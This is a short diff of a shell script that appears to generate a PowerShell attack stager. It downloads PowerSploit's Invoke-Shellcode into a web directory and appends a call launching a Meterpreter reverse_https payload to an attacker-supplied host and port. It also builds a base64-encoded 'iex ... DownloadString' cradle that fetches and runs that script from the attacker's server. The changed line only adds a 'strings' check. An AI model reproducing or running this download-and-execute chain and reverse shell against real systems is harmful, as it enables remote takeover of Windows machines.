@@ -62,6 +62,7 @@ wget -O /var/www/plugin https://raw.github.com/mattifestation/PowerSploit/master
 #append a call to the Invoke-Shellcode function with the proper arguments
 func="Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $lhost -Lport $lport -Force"
 echo "$func" >> /var/www/plugin
+strings -es /var/www/plugin
 
 #base64 encode the stager scriptblock
 scriptblock="iex (New-Object Net.WebClient).DownloadString("http://$lhost/plugin")"
